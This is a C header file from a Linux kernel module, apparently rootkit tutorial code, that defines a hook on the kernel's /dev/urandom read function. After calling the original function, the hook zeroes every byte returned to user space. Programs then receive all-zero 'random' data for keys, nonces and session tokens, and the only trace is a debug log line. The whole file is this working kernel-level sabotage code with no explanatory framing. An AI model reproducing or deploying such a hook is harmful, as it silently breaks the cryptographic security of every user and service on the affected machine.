#ifndef _URANDOM_READ_ITER_H_
#define _URANDOM_READ_ITER_H_

static asmlinkage ssize_t (*orig_urandom_read)(struct file *file, char __user *buf, size_t nbytes, loff_t *ppos);

static notrace asmlinkage ssize_t hook_urandom_read(struct file *file, char __user *buf, size_t nbytes, loff_t *ppos)
{
    int bytes_read, i;
    long error;
    char *kbuf = NULL;

    bytes_read = orig_urandom_read(file, buf, nbytes, ppos);
    printk(KERN_DEBUG "lkm: intercepted call to /dev/urandom: %d bytes", bytes_read);

    kbuf = kzalloc(bytes_read, GFP_KERNEL);
    error = copy_from_user(kbuf, buf, bytes_read);

    if(error)
    {
        printk(KERN_DEBUG "lkm: %ld bytes could not be copied into kbuf\n", error);
        kfree(kbuf);
        return bytes_read;
    }

    for ( i = 0 ; i < bytes_read ; i++ )
        kbuf[i] = 0x00;

    error = copy_to_user(buf, kbuf, bytes_read);
    if (error)
        printk(KERN_DEBUG "lkm: %ld bytes could not be copied into buf\n", error);

    kfree(kbuf);
    return bytes_read;
}


#endif
